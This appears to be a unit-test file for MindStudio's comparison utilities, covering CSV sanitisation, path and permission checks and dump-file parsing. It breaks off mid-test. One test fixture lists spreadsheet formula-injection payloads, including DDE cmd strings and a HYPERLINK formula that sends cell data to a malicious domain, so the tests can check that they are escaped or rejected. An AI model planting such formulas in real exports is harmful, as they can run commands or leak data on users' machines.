# -------------------------------------------------------------------------
#  This file is part of the MindStudio project.
# Copyright (c) 2025 Huawei Technologies Co.,Ltd.
#
# MindStudio is licensed under Mulan PSL v2.
# You can use this software according to the terms and conditions of the Mulan PSL v2.
# You may obtain a copy of Mulan PSL v2 at:
#
#          http://license.coscl.org.cn/MulanPSL2
#
# THIS SOFTWARE IS PROVIDED ON AN "AS IS" BASIS, WITHOUT WARRANTIES OF ANY KIND,
# EITHER EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO NON-INFRINGEMENT,
# MERCHANTABILITY OR FIT FOR A PARTICULAR PURPOSE.
# See the Mulan PSL v2 for more details.
# -------------------------------------------------------------------------

import os
import unittest
from unittest import mock
from unittest.mock import patch, MagicMock
import struct
import csv
import stat
import pytest
import numpy as np
from google.protobuf.message import DecodeError

from cmp_utils import utils, utils_type, path_check
from cmp_utils import log
from vector_cmp.fusion_manager import fusion_op
from dump_parse.big_dump_data import BigDumpDataParser
from cmp_utils.constant.compare_error import CompareError
from cmp_utils.multi_process.progress import Progress
from cmp_utils.constant.const_manager import ConstManager
from dump_parse import dump, dump_utils, mapping, dump_data_object
from dump_parse.proto_dump_data import DumpData, OpInput, OpOutput
from cmp_utils.constant.const_manager import DD


class TestUtilsMethods(unittest.TestCase):
    mock_stat_result = os.stat_result((0, 0, 0, 0, os.getuid(), 0, 0, 0, 0, 0))

    @staticmethod
    def _make_op_output(dd_format, shape):
        op_output = OpOutput()
        op_output.data_type = DD.DT_FLOAT16
        op_output.format = dd_format
        length = 1
        for dim in shape:
            op_output.shape.dim.append(dim)
            length *= dim
        data_list = np.arange(length)
        origin_numpy = np.array(data_list, np.float16)
        op_output.data = struct.pack('e' * length, *origin_numpy)
        return op_output

    @staticmethod
    def _set_op_output(op_output, dd_format, shape):
        op_output.data_type = DD.DT_FLOAT16
        op_output.format = dd_format
        length = 1
        for dim in shape:
            op_output.shape.dim.append(dim)
            length *= dim
        data_list = np.arange(length)
        origin_numpy = np.array(data_list, np.float16)
        op_output.data = struct.pack('e' * length, *origin_numpy)
        op_output.size = len(op_output.data)
        return op_output

    @staticmethod
    def _make_fusion_op():
        attr = fusion_op.OpAttr(['conv1', 'conv1_relu'], '', False, 12)
        output_desc_list = []
        output_desc = fusion_op.OutputDesc('conv1_relu', 0, 'NCHW',
                                           [1, 3, 224, 224])
        output_desc_list.append(output_desc)
        return fusion_op.FusionOp(12, 'conv1conv1_relu', ['a:0,b:0'], 'Relu', output_desc_list, attr)

    @classmethod
    def setUpClass(cls):
        cls.malicious_csv_values = [
                "=cmd|' /C calc'!A0",
                "@ABS(cmd|' /C calc'!A0)",
                "-cmd|' /C calc'!A0",
                "%00+cmd|' /C calc'!A0",
                "%0a%0d+cmd|' /C calc'!A0",
                "=cmd|'/c calc'!'A1'",
                "-1+1+cmd|' /C calc'!A0",
                "@SUM(cmd|' /C calc'!A0)",
                "=cmd|'/k ipconfig'!A0",
                '=1+1',
'=6-5 cmd|\' /C "C:\\Program Files\\InternetExplorer\\iexplore.exe" http://<attackers site>/asd.html\'!A0',
 '=HYPERLINK("https://maliciousDomain.com/evil.html?data="&A1,"Click to view additional information")'
        ]


    def test_print_info_log(self):
        log.print_info_log('test info log')

    def test_print_error_log(self):
        log.print_error_log('test error log')

    def test_print_warn_log(self):
        log.print_warn_log('test warn log')

    def test_sanitize_csv_ignore(self):
        for value in self.malicious_csv_values:
            with self.subTest(value=value):
                self.assertEqual(value, utils.sanitize_csv_value(value, errors='ignore'))
    
    def test_sanitize_csv_replace(self):
        for value in self.malicious_csv_values:
            with self.subTest(value=value):
                self.assertEqual(' ' + value, utils.sanitize_csv_value(value, errors='replace'))

    def test_sanitize_csv_strict(self):
        for value in self.malicious_csv_values:
            with self.subTest(value=value):
                self.assertRaises(ValueError, utils.sanitize_csv_value, value, errors='strict')

    def test_sanitize_csv_not_str(self):
        values = [1, 2.5, 1+2j, (1, 2), [1, 2]]
        for value in values:
            with self.subTest(value=value):
                self.assertEqual(value, utils.sanitize_csv_value(value))

    def test_sanitize_csv_digit_str(self):
        values = ['1.1', '+1.1', '-1.1']
        for value in values:
            with self.subTest(value=value):
                self.assertEqual(value, utils.sanitize_csv_value(value))

    @mock.patch("cmp_utils.common.get_dtype_by_data_type")
    def test_deserialize_dump_data_to_array(self, mock_common):
        mock_common.return_value = np.uint8
        op_output = mock.Mock()
        op_output.data = b'\x01\x02'
        op_output.shape.dim = [1]
        numpy_data = dump_data_object._deserialize_dump_data_to_array(op_output.data, 1, list(op_output.shape.dim))
        self.assertEqual(len(numpy_data), 1)

    def test_space_to_comma(self):
        value = 'a,b,c d,e 1.0 0.1 (3.0,4.0);(5.3,6.5)'
        new_value = utils.space_to_comma(value)
        self.assertEqual(new_value, 'a b c,d e,1.0,0.1,(3.0 4.0);(5.3 6.5)')

    def test_ceiling_divide(self):
        self.assertEqual(utils.ceiling_divide(10, 3), 4)
        self.assertEqual(utils.ceiling_divide(5, 5), 1)
        self.assertEqual(utils.ceiling_divide(0, 1), 0)
        with self.assertRaises(ZeroDivisionError):
            utils.ceiling_divide(10, 0)
    
    @patch('os.stat')
    @patch('os.getuid', return_value=100)
    @patch("cmp_utils.log.print_error_log")
    def test_check_exec_file_valid_when_not_owner(self, mock_error, mock_getuid, mock_os_stat):
        exist_path = "path"
        mock_os_stat.return_value = MagicMock(st_uid=1000)
        ret = path_check.check_exec_file_valid(exist_path)
        mock_error.assert_called_once_with('You are not the owner of the path "%r".' % exist_path)
        self.assertEqual(ret, CompareError.MSACCUCMP_INVALID_PATH_ERROR)
    
    @patch('os.stat')
    @patch('os.getuid', return_value=1000)
    @patch('os.getgroups', return_value=[100, 200])
    @patch("cmp_utils.log.print_error_log")
    def test_check_exec_file_valid_when_not_in_group(self, mock_error, mock_getgroups, mock_getuid, mock_os_stat):
        exist_path = "path"
        mock_os_stat.return_value = MagicMock(st_uid=1000)
        ret = path_check.check_exec_file_valid(exist_path)
        mock_error.assert_called_once_with('You are not in the group of the path "%r".' % exist_path)
        self.assertEqual(ret, CompareError.MSACCUCMP_INVALID_PATH_ERROR)
    
    @patch('os.stat')
    @patch('os.getuid', return_value=1000)
    @patch('os.getgroups', return_value=[1000, 2000])
    @patch('cmp_utils.path_check.check_others_permission', return_value=9)
    def test_check_exec_file_valid_when_not_none_error(self, mock_check_others_permission, 
                                                            mock_getgroups, mock_getuid, mock_os_stat):
        exist_path = "path"
        mock_os_stat.return_value = MagicMock(st_uid=0, st_gid=0)

        with self.assertRaises(CompareError) as context:
            ret = path_check.check_exec_file_valid(exist_path)
        assert context.exception.args[0] == CompareError.MSACCUCMP_OPEN_DIR_ERROR

    @patch('os.stat')
    @patch('os.getuid', return_value=1000)
    @patch('os.getgroups', return_value=[1000, 2000])
    @patch('cmp_utils.path_check.check_others_permission', return_value=0)
    @patch('cmp_utils.path_check.check_path_valid', return_value="hhh")
    def test_check_exec_file_valid_when_correct_input(self, mock_check_path_valid, 
                                        mock_check_others_permission, mock_getgroups, mock_getuid, mock_os_stat):
        exist_path = "path"
        mock_os_stat.return_value = MagicMock(st_uid=0, st_gid=0)
        ret = path_check.check_exec_file_valid(exist_path)
        self.assertEqual(ret, "hhh")
    
    @patch('os.walk', return_value=[["z/z"*60, 1, 1]])
    def test_check_path_all_file_exec_valid_when_input_too_deep_path(self, mock_os_walk):
        custom_path = "path"
        with self.assertRaises(CompareError) as context:
            ret = path_check.check_path_all_file_exec_valid(custom_path)
        assert context.exception.args[0] == f"custom path is deep then {ConstManager.MAX_WALK_DIR_DEEP_NUM}"
    
    @patch('os.walk', return_value=[["z/z"*10, 1, ['1']]])
    @patch('cmp_utils.path_check.check_exec_file_valid', return_value=9)
    def test_check_path_all_file_exec_valid_when_raise_raise_compare_error_ret(self, 
                                                                        mock_check_exec_file_valid, mock_os_walk):
        custom_path = "path"
        with self.assertRaises(CompareError) as context:
            ret = path_check.check_path_all_file_exec_valid(custom_path)
        assert context.exception.args[0] == CompareError.MSACCUCMP_OPEN_DIR_ERROR
    
    @patch('os.walk', return_value=[["z/z"*10, 1, ['1']*2000]])
    @patch('cmp_utils.path_check.check_exec_file_valid', return_value=0)
    @patch('cmp_utils.utils.check_file_size', return_value=True)
    def test_check_path_all_file_exec_valid_when_input_too_much_files(self, mock_check_file_size, 
                                                                            mock_check_exec_file_valid, mock_os_walk):
        custom_path = "path"
        with self.assertRaises(CompareError) as context:
            ret = path_check.check_path_all_file_exec_valid(custom_path)
        assert context.exception.args[0] == f"file count in custom path is more then {ConstManager.MAX_WALK_FILE_NUM}"

    @patch('os.walk', return_value=[["z/z"*10, ["1"], []]])
    @patch('cmp_utils.path_check.check_exec_file_valid', return_value=1)
    @patch('cmp_utils.path_check.check_path_valid', return_value=9)
    def test_check_path_all_file_exec_valid_when_input_dir_not_valid(self, mock_check_path_valid, 
                                                                            mock_check_exec_file_valid, mock_os_walk):
        custom_path = "path"
        with self.assertRaises(CompareError) as context:
            ret = path_check.check_path_all_file_exec_valid(custom_path)
        assert context.exception.args[0] == CompareError.MSACCUCMP_OPEN_DIR_ERROR
    
    @patch('os.stat')
    @patch('os.getuid', return_value=100)
    def test_is_same_owner_false(self, mock_getuid, mock_os_stat):
        path = "path"
        mock_os_stat.return_value = MagicMock(st_uid=1000)
        self.assertFalse(path_check.is_same_owner(path))

    @patch('os.stat')
    @patch('os.getuid', return_value=0)
    def test_is_same_owner_true(self, mock_getuid, mock_os_stat):
        path = "path"
        mock_os_stat.return_value = MagicMock(st_uid=1000)
        self.assertTrue(path_check.is_same_owner(path))
    
    @patch('os.stat')
    def test_is_group_and_others_writable_true(self, mock_os_stat):
        path = "path"
        mock_os_stat.return_value = MagicMock(st_mode=stat.S_IWGRP)
        self.assertTrue(path_check.is_group_and_others_writable(path))
    
    @patch('os.stat')
    def test_is_group_and_others_writable_false(self, mock_os_stat):
        path = "path"
        mock_os_stat.return_value = MagicMock(st_mode=0o000)
        self.assertFalse(path_check.is_group_and_others_writable(path))

    @patch("cmp_utils.path_check.is_same_owner", return_value=True)
    @patch("cmp_utils.path_check.is_group_and_others_writable", return_value=False)
    def test_is_parent_dir_has_right_permission_both_true(self,     
                                                        mock_is_group_and_others_writable, mock_is_same_owner):
        path = "path"
        self.assertTrue(path_check.is_parent_dir_has_right_permission(path))
    
    @patch("cmp_utils.path_check.is_same_owner", return_value=True)
    @patch("cmp_utils.path_check.is_group_and_others_writable", return_value=True)
    def test_is_parent_dir_has_right_permission_both_false(self, 
                                                        mock_is_group_and_others_writable, mock_is_same_owner):
        path = "path"
        self.assertFalse(path_check.is_parent_dir_has_right_permission(path))
    
    @patch('os.stat')
    @patch("cmp_utils.log.print_error_log")
    def test_check_others_permission_when_groups_have_write_premission(self, mock_error, mock_os_stat):
        exist_path = "path"
        mock_os_stat.return_value = MagicMock(st_gid=1, st_mode=stat.S_IWGRP)
        ret = path_check.check_others_permission(exist_path)
        mock_error.assert_called_once_with(f"File {exist_path} is not safe. "
                                                "Groups have writing permission to this file.")
        self.assertEqual(ret, CompareError.MSACCUCMP_INVALID_PATH_ERROR)
    
    @patch('os.stat')
    @patch("cmp_utils.log.print_error_log")
    def test_check_others_permission_when_others_have_write_premission(self, mock_error, mock_os_stat):
        exist_path = "path"
        mock_os_stat.return_value = MagicMock(st_gid=0, st_mode=stat.S_IWOTH)
        ret = path_check.check_others_permission(exist_path)
        mock_error.assert_called_once_with("File %r is dangerous. Others have writing "
                            "permission to this file. Please use chmod to dismiss the writing permission." % exist_path)
        self.assertEqual(ret, CompareError.MSACCUCMP_INVALID_PATH_ERROR)
    
    @patch('os.stat')
    @patch("cmp_utils.log.print_error_log")
    def test_check_others_permission_when_premission_right(self, mock_error, mock_os_stat):
        exist_path = "path"
        mock_os_stat.return_value = MagicMock(st_gid=0, st_mode=0)
        ret = path_check.check_others_permission(exist_path)
        self.assertEqual(ret, CompareError.MSACCUCMP_NONE_ERROR)

    def test_check_name_valid1(self):
        ret = path_check.check_name_valid('')
        self.assertEqual(ret, CompareError.MSACCUCMP_INVALID_PARAM_ERROR)

    def test_check_name_valid2(self):
        ret = path_check.check_name_valid('xxx$%^&**&^&')
        self.assertEqual(ret, CompareError.MSACCUCMP_INVALID_PARAM_ERROR)

    def test_check_name_valid3(self):
        ret = path_check.check_name_valid('prob')
        self.assertEqual(ret, CompareError.MSACCUCMP_NONE_ERROR)

    def test_least_common_multiple(self):
        self.assertEqual(utils.least_common_multiple(2, 3), 6)
        self.assertEqual(utils.least_common_multiple(4, 6), 12)
        self.assertEqual(utils.least_common_multiple(0, 5), 0)
        self.assertEqual(utils.least_common_multiple(7, 0), 0)

    def test_read_numpy_file1(self):
        dump_data = np.arange(2)
        with mock.patch('numpy.loadtxt', return_value=dump_data):
            with mock.patch('cmp_utils.path_check.check_path_valid',
                            return_value=CompareError.MSACCUCMP_NONE_ERROR), \
                    mock.patch('os.path.getsize', return_value=12):
                ret = dump_utils.read_numpy_file('/home/a.txt')
        self.assertEqual(len(dump_data), len(ret))
        self.assertEqual(dump_data[0], ret[0])
        self.assertEqual(dump_data[1], ret[1])

    def test_read_numpy_file2(self):
        with pytest.raises(CompareError) as error:
            dump_utils.read_numpy_file('')
        self.assertEqual(error.value.args[0],
                         CompareError.MSACCUCMP_INVALID_PARAM_ERROR)

    def test_read_numpy_file3(self):
        dump_data = np.arange(2)
        with mock.patch('numpy.load', return_value=dump_data):
            with mock.patch('cmp_utils.path_check.check_path_valid',
                            return_value=CompareError.MSACCUCMP_NONE_ERROR), \
                    mock.patch('os.path.getsize', return_value=12):
                ret = dump_utils.read_numpy_file('/home/a.bin')
        self.assertEqual(len(dump_data), len(ret))
        self.assertEqual(dump_data[0], ret[0])
        self.assertEqual(dump_data[1], ret[1])

    def test_read_numpy_file4(self):
        with pytest.raises(CompareError) as error:
            with mock.patch('cmp_utils.path_check.check_path_valid',
                            return_value=CompareError.MSACCUCMP_NONE_ERROR), \
                    mock.patch('os.path.getsize', return_value=12):
                with mock.patch('numpy.load', side_effect=ValueError):
                    dump_utils.read_numpy_file('a.bin')
        self.assertEqual(error.value.args[0],
                         CompareError.MSACCUCMP_INVALID_DUMP_DATA_ERROR)

    def test_read_numpy_file5(self):
        with pytest.raises(CompareError) as error:
            with mock.patch('cmp_utils.path_check.check_path_valid',
                            return_value=CompareError.MSACCUCMP_NONE_ERROR), \
                    mock.patch('os.path.getsize', return_value=12):
                with mock.patch('numpy.load', side_effect=UnicodeDecodeError):
                    dump_utils.read_numpy_file('a.bin')
        self.assertEqual(error.value.args[0],
                         CompareError.MSACCUCMP_INVALID_DUMP_DATA_ERROR)

    def test_read_numpy_file6(self):
        with pytest.raises(CompareError) as error:
            with mock.patch('cmp_utils.path_check.check_path_valid',
                            return_value=CompareError.MSACCUCMP_NONE_ERROR), \
                    mock.patch('os.path.getsize', return_value=12):
                with mock.patch('numpy.loadtxt', side_effect=UnicodeDecodeError):
                    dump_utils.read_numpy_file('a.txt')
        self.assertEqual(error.value.args[0],
                         CompareError.MSACCUCMP_INVALID_DUMP_DATA_ERROR)

    def test_read_numpy_file7(self):
        dump_data = np.arange(2)
        with pytest.raises(CompareError) as error:
            with mock.patch('numpy.loadtxt', return_value=dump_data):
                with mock.patch('cmp_utils.path_check.check_path_valid',
                                return_value=CompareError.MSACCUCMP_NONE_ERROR), \
                        mock.patch('os.path.getsize', return_value=0):
                    ret = dump_utils.read_numpy_file('/home/a.txt')
        self.assertEqual(error.value.args[0],
                         CompareError.MSACCUCMP_INVALID_DUMP_DATA_ERROR)

    def test_convert_shape_to_string(self):
        shape_str = utils.convert_shape_to_string([1, 3, 224, 224])
        self.assertEqual(shape_str, '(1, 3, 224, 224)')

    def test_get_string_from_list1(self):
        shape_str = utils.get_string_from_list([1, 3, 224, 224], 'x')
        self.assertEqual(shape_str, '1x3x224x224')

    def test_get_string_from_list2(self):
        shape_str = utils.get_string_from_list(["1", "3", "224", "224"], 'x')
        self.assertEqual(shape_str, '1x3x224x224')

    def test_format_value(self):
        value = 2.3658412
        new_value = utils.format_value(value)
        self.assertEqual(new_value, '2.365841')

    def test_check_path_valid1(self):
        ret = path_check.check_path_valid('', True)
        self.assertEqual(ret, CompareError.MSACCUCMP_INVALID_PARAM_ERROR)

    def test_check_path_valid2(self):
        ret = path_check.check_path_valid('/home/7%##3', True)
        self.assertEqual(ret, CompareError.MSACCUCMP_INVALID_PARAM_ERROR)

    def test_check_path_valid3(self):
        with mock.patch('os.path.exists', return_value=False):
            ret = path_check.check_path_valid('/home/result.txt', False)
        self.assertEqual(ret, CompareError.MSACCUCMP_INVALID_PATH_ERROR)

    def test_check_path_valid4(self):
        with mock.patch('os.path.exists', return_value=True):
            with mock.patch('os.access', return_value=False):
                ret = path_check.check_path_valid('/home/result.txt', False)
        self.assertEqual(ret, CompareError.MSACCUCMP_INVALID_PATH_ERROR)

    def test_check_path_valid5(self):
        with mock.patch('os.path.exists', return_value=True):
            with mock.patch('os.access', return_value=True):
                with mock.patch('os.stat', return_value=self.mock_stat_result):
                    ret = path_check.check_path_valid('/home/result', True, True)
        self.assertEqual(ret, CompareError.MSACCUCMP_NONE_ERROR)

    def test_check_path_valid6(self):
        with mock.patch('os.path.exists', return_value=True):
            with mock.patch('os.access', return_value=True):
                with mock.patch('os.path.isfile', return_value=False):
                    with mock.patch('os.stat', return_value=self.mock_stat_result):
                        ret = path_check.check_path_valid(
                            '/home/result.txt', True, False, path_check.PathType.File)
        self.assertEqual(ret, CompareError.MSACCUCMP_INVALID_PATH_ERROR)

    def test_check_path_valid7(self):
        with mock.patch('os.path.exists', return_value=True):
            with mock.patch('os.access', return_value=True):
                with mock.patch('os.path.isdir', return_value=False):
                    with mock.patch('os.stat', return_value=self.mock_stat_result):
                        ret = path_check.check_path_valid(
                            '/home/result.txt', True, False,
                            path_check.PathType.Directory)
        self.assertEqual(ret, CompareError.MSACCUCMP_INVALID_PATH_ERROR)

    def test_check_path_valid8(self):
        with mock.patch('os.path.exists', return_value=True):
            with mock.patch('os.access', side_effect=[True, False]):
                ret = path_check.check_path_valid(
                    '/home/result', True, True, path_check.PathType.Directory)
        self.assertEqual(ret, CompareError.MSACCUCMP_INVALID_PATH_ERROR)

    def test_check_path_valid9(self):
        with mock.patch('os.path.exists', return_value=True):
            with mock.patch('os.access', return_value=True):
                with mock.patch('os.path.islink', return_value=True):
                    ret = path_check.check_path_valid(
                        '/home/result', True, True, path_check.PathType.Directory)
        self.assertEqual(ret, CompareError.MSACCUCMP_INVALID_PATH_ERROR)

    def test_check_path_valid_when_uid_not_in_groups(self):
        with mock.patch('os.path.exists', return_value=True):
            with mock.patch('os.access', return_value=True):
                with mock.patch('os.getuid', return_value=1000):
                    with mock.patch('os.stat', return_value=self.mock_stat_result):
                        with mock.patch('os.getgroups', return_value=[1001, 1002]):
                            ret = path_check.check_path_valid('/home/result', True, True,
                                                              path_check.PathType.Directory)
        self.assertEqual(ret, CompareError.MSACCUCMP_INVALID_PATH_ERROR)

    def test_parse_dump_file1(self):
        with pytest.raises(CompareError) as error:
            with mock.patch('cmp_utils.path_check.check_path_valid',
                            return_value=CompareError.MSACCUCMP_INVALID_PATH_ERROR):
                dump_utils.parse_dump_file('/home', 2)
        self.assertEqual(error.value.args[0],
                         CompareError.MSACCUCMP_INVALID_PATH_ERROR)

    def test_parse_dump_file2(self):
        with pytest.raises(CompareError) as error:
            with mock.patch('cmp_utils.path_check.check_path_valid',
                            return_value=CompareError.MSACCUCMP_NONE_ERROR):
                with mock.patch('dump_parse.nano_dump_data.NanoDumpDataHandler.check_is_nano_dump_format',
                                return_value=False):
                    with mock.patch('builtins.open', side_effect=IOError):
                        dump_utils.parse_dump_file('/home', 2)
        self.assertEqual(error.value.args[0],
                         CompareError.MSACCUCMP_INVALID_DUMP_DATA_ERROR)

    def test_parse_dump_file3(self):
        with pytest.raises(CompareError) as error:
            with mock.patch('cmp_utils.path_check.check_path_valid',
                            return_value=CompareError.MSACCUCMP_NONE_ERROR):
                with mock.patch('dump_parse.nano_dump_data.NanoDumpDataHandler.check_is_nano_dump_format',
                                return_value=False):
                    with mock.patch('os.path.getsize', return_value=0):
                        dump_utils.parse_dump_file('/home/a.dump', 2)
        self.assertEqual(error.value.args[0],
                         CompareError.MSACCUCMP_INVALID_DUMP_DATA_ERROR)

    def test_parse_dump_file4(self):
        fake_json = {
            "version": "1.0",
            "dump_time": 12345678,
            "input": [
                {"data_type": 2, "size": 8}
            ],
            "output": [
                {"data_type": 2, "size": 8}
            ]
        }
        with mock.patch('cmp_utils.path_check.check_path_valid',
                        return_value=CompareError.MSACCUCMP_NONE_ERROR):
            with mock.patch('dump_parse.nano_dump_data.NanoDumpDataHandler.check_is_nano_dump_format',
                            return_value=False):
                with mock.patch('os.path.getsize', return_value=10):
                    with mock.patch('builtins.open', mock.mock_open(read_data="0")):
                        with mock.patch.object(BigDumpDataParser, "parse", return_value=DumpData.from_dict(fake_json)):
                            dump_data = dump_utils.parse_dump_file('/home/a.dump', 1)
        self.assertEqual(dump_data.output_data[0].data_type, DD.DT_FLOAT16)
        data_byte = utils.convert_ndarray_to_bytes(dump_data.output_data[0].data)
        self.assertEqual(len(data_byte), 0)

    def test_parse_dump_file5(self):
        fake_json = {
            "version": "1.0",
            "dump_time": 12345678,
            "input": [
                {"data_type": 2, "size": 8}
            ],
            "output": [
                {"data_type": 2, "size": 8}
            ]
        }
        with mock.patch('cmp_utils.path_check.check_path_valid',
                        return_value=CompareError.MSACCUCMP_NONE_ERROR):
            with mock.patch('os.path.getsize', return_value=10):
                with mock.patch('builtins.open', mock.mock_open(read_data="0")):
                    with mock.patch.object(BigDumpDataParser, "parse", return_value=DumpData.from_dict(fake_json)):
                        dump_data = dump_utils.parse_dump_file('/home/a.dump', 1)
        self.assertEqual(dump_data.output_data[0].size, 8)

    def test_parse_dump_file6(self):
        dump_data = DumpData()
        output = dump_data.output.add()
        self._set_op_output(output, DD.FORMAT_NC1HWC0, [1, 3, 2, 2, 2])
        dump_data_ser = dump_data.SerializeToString()
        with pytest.raises(CompareError) as error:
            with mock.patch('cmp_utils.path_check.check_path_valid',
                            return_value=CompareError.MSACCUCMP_NONE_ERROR):
                with mock.patch('os.path.getsize', return_value=len(dump_data_ser)):
                    with mock.patch('builtins.open', mock.mock_open(read_data=dump_data_ser)):
                        with mock.patch('dump_parse.proto_dump_data.DumpData.ParseFromString', return_value=1000):
                            dump_utils.parse_dump_file('/home/a.dump', 0)
        self.assertEqual(error.value.args[0],
                         CompareError.MSACCUCMP_INVALID_DUMP_DATA_ERROR)

    def test_parse_dump_file7(self):
        dump_data = DumpData()
        output = dump_data.output.add()
        self._set_op_output(output, DD.FORMAT_NC1HWC0, [1, 3, 2, 2, 2])
        dump_data_ser = dump_data.SerializeToString()
        with pytest.raises(CompareError) as error:
            with mock.patch('cmp_utils.path_check.check_path_valid',
                            return_value=CompareError.MSACCUCMP_NONE_ERROR):
                with mock.patch('os.path.getsize',
                                return_value=len(dump_data_ser)):
                    with mock.patch('builtins.open',
                                    mock.mock_open(read_data=dump_data_ser)):
                        with mock.patch(
                                'dump_parse.proto_dump_data.DumpData.ParseFromString',
                                side_effect=DecodeError):
                            dump_utils.parse_dump_file('/home/a.dump', 0)
        self.assertEqual(error.value.args[0],
                         CompareError.MSACCUCMP_INVALID_DUMP_DATA_ERROR)

    def test_parse_dump_file8(self):
        with mock.patch('cmp_utils.path_check.check_path_valid', return_value=CompareError.MSACCUCMP_NONE_ERROR):
            with mock.patch('os.path.getsize', return_value=1210):
                with mock.patch('numpy.load', return_value=np.ones([1, 3, 2, 2])):
                    with mock.patch('dump_parse.nano_dump_data.NanoDumpDataHandler.check_is_nano_dump_format',
                                    return_value=False):
                        dump_data = dump_utils.parse_dump_file('/home/a.npy', 0)
        self.assertEqual(dump_data.output_data[0].shape[1], 3)

    def test_print_progress1(self):
        with mock.patch('time.time', return_value=3):
            progress = Progress(10)
            progress.update_progress()
            progress.update_and_print_progress(52.25)

    def test_print_progress2(self):
        with mock.patch('time.time', return_value=3):
            progress = Progress(10)
            progress.update_progress()
            progress.update_and_print_progress()

    def test_print_deprecated_warning(self):
        log.print_deprecated_warning("/home/a.py")

    def test_read_mapping_file1(self):
        mapping_file_path = "/home/demo/1.csv"
        csv_object = [[13243254435, "/home/demo/Add.0.1223242.npy"]]
        with mock.patch("os.path.isfile", return_value=True):
            with mock.patch('builtins.open', mock.mock_open(read_data="demo")):
                with mock.patch('os.path.getsize', return_value=1024):
                    with mock.patch("csv.reader", return_value=csv_object):
                        hash_map = mapping.read_mapping_file(mapping_file_path)
        self.assertEqual(hash_map, {13243254435: "/home/demo/Add.0.1223242.npy"})

    def test_read_mapping_file2(self):
        mapping_file_path = "/home/demo/1.csv"
        csv_object = [[13243254435]]
        with mock.patch("os.path.isfile", return_value=True):
            with mock.patch('builtins.open', mock.mock_open(read_data="demo")):
                with mock.patch('os.path.getsize', return_value=1024):
                    with mock.patch("csv.reader", return_value=csv_object):
                        hash_map = mapping.read_mapping_file(mapping_file_path)
        self.assertEqual(hash_map, {})

    def test_read_mapping_file3(self):
        mapping_file_path = "/home/demo/1.csv"
        with mock.patch("os.path.isfile", return_value=True):
            with mock.patch('builtins.open', mock.mock_open(read_data="demo")):
                with mock.patch('os.path.getsize', return_value=1024):
                    with mock.patch("csv.reader", side_effect=IOError):
                        hash_map = mapping.read_mapping_file(mapping_file_path)
        self.assertEqual(hash_map, {})

    def test_sort_result_file_by_index1(self):
        result_reader = [['0', 'input_ids', 'input_ids', 'input_ids:output:0', '1.000000', '0.000000', '0.000000',
                          '0.000000', '0.000000', '(1171.945;2293.594),(1171.945;2293.594)', '']]
        result_file = "/home/demo/1.csv"
        result_file_content = 'Index,LeftOp,RightOp,TensorIndex,MaxAbsoluteError,MaxAbsoluteError,CompareFailReason'
        with mock.patch('builtins.open', mock.mock_open(read_data=result_file_content)):
            with mock.patch('os.path.getsize', return_value=1024):
                with mock.patch('os.open'), mock.patch("os.fdopen"):
                    csv.reader = mock.Mock(return_value=result_reader)
                    utils.sort_result_file_by_index(result_file)

    def test_sort_result_file_by_index2(self):
        result_file = "/home/demo/2.csv"
        result_file_content = 'Index LeftOp RightOp TensorIndex MaxAbsoluteError MaxAbsoluteError CompareFailReason\n'
        result = '0 input_ids input_ids input_ids:output:0 1.000000 0.000000 0.000000 0.000000 0.000000' \
                 ' \'(1171.945;2293.594) (1171.945;2293.594)\''
        with mock.patch('builtins.open', mock.mock_open(read_data=result_file_content + result)):
            with mock.patch('os.path.getsize', return_value=1024):
                with mock.patch('os.open'), mock.patch("os.fdopen"):
                    utils.sort_result_file_by_index(result_file, False)

    def test_sort_result_file_by_index3(self):
        result_file = "/home/demo/3.csv"
        with mock.patch('builtins.open', side_effect=IOError):
            with mock.patch('os.path.getsize', return_value=1024):
                utils.sort_result_file_by_index(result_file)

    def test_get_shape_type1(self):
        shape_dim_array = [0]
        result = utils.get_shape_type(shape_dim_array)
        self.assertEqual(result, utils_type.ShapeType.Tensor)

    def test_get_shape_type2(self):
        shape_dim_array = [1, 1, 1]
        result = utils.get_shape_type(shape_dim_array)
        self.assertEqual(result, utils_type.ShapeType.Scalar)

    def test_get_shape_type3(self):
        shape_dim_array = [1, 3, 2]
        result = utils.get_shape_type(shape_dim_array)
        self.assertEqual(result, utils_type.ShapeType.Tensor)

    def test_get_path_list_for_str1(self):
        with mock.patch('cmp_utils.path_check.check_path_valid',
                        return_value=CompareError.MSACCUCMP_NONE_ERROR):
            path_list = path_check.get_path_list_for_str('/home/a.bin')
        self.assertEqual(1, len(path_list))

    def test_get_path_list_for_str2(self):
        with pytest.raises(CompareError) as error:
            with mock.patch('cmp_utils.path_check.check_path_valid',
                            return_value=CompareError.MSACCUCMP_UNKNOWN_ERROR):
                path_check.get_path_list_for_str('/home/a.bin')
        self.assertEqual(error.value.args[0], CompareError.MSACCUCMP_UNKNOWN_ERROR)

    def test_get_path_list_for_str3(self):
        with pytest.raises(CompareError) as error:
            with mock.patch('cmp_utils.path_check.check_path_valid',
                            return_value=CompareError.MSACCUCMP_UNKNOWN_ERROR):
                path_check.get_path_list_for_str('/home/a.bin,/home/b.bin')
        self.assertEqual(error.value.args[0], CompareError.MSACCUCMP_INVALID_PATH_ERROR)

    def test_get_path_list_for_str4(self):
        with mock.patch('cmp_utils.path_check.check_path_valid',
                        return_value=CompareError.MSACCUCMP_NONE_ERROR):
            path_list = path_check.get_path_list_for_str('/home/a.bin,/home/b.bin')
        self.assertEqual(2, len(path_list))

    def test_make_msnpy_file_name1(self):
        file_path = '/home/aa.bin'
        file_name = utils.make_msnpy_file_name(file_path, 'xx', 'input', 0, DD.FORMAT_NC1HWC0)
        self.assertEqual('aa.bin.input.0.NC1HWC0.npy', file_name)

    def test_make_msnpy_file_name2(self):
        file_path = '/home/axxx/FusionOp_Conv2DBackpropInput_ReluGradV2.Gradients_Default_network-TrainOneStepCell' \
                    '_network-WithLossCell__backbone-ResNet_gradReLU_FusionOp_Conv2DBackpropInput_' \
                    'ReluGradV2-op2739.31.9.1630556346146690'
        file_name = utils.make_msnpy_file_name(file_path,
                                               'ReluGradV2-op2739',
                                               'input', 0, DD.FORMAT_NC1HWC0)
        self.assertEqual(
            'FusionOp_Conv2DBackpropInput_ReluGradV2.ReluGradV2-op2739.31.9.1630556346146690.input.0.NC1HWC0.npy',
            file_name)

    def test_sort_dump_file_list1(self):
        dump_file_list = ["Cast.trans_Cast_1238.105.9.2670295569938495",
                          "Cast.trans_Cast_1238.105.9.1670295569938497",
                          "Cast.trans_Cast_1238.105.9.1670295569938495"]
        dump_file_type = ConstManager.NORMAL_MODE
        sorted_list = ["Cast.trans_Cast_1238.105.9.1670295569938495",
